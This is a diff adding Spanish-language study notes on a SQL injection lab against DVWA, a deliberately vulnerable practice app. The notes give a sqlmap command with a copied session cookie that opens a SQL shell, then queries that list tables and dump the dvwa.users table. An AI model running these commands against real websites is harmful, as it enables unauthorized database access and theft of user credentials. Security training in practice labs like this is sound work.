@@ -2,4 +2,14 @@
 tamente
 
 ++ Terminal
---- 
+--- sqlmap -u <url_copiada> --cookie='PHPSESSID=<valor_copiado>; security=low' --sql-shell --batch 
+---- Se mostrará el acceso al shell de la base de datos, lo que nos permite ejecutar comandos como:
+----- database(); ---> El comando nos devolverá el nombre de la base de datos actual
+----- select table_name from information_schema.tables WHERE table_schema = 'dvwa';
+------> Este comando permitirá ver todas las tablas presentes en la base de datos
+dvwa
+----- select * from dvwa; ---> Permite realizar una selección de toda la información
+referente a la base de datos
+----- select * from dvwa.users; ---> Permite seleccionar toda la información referente a la tabla users de la base de datos dvwa
+--- x ---> Nos permite salir del shell de la base de datos
+
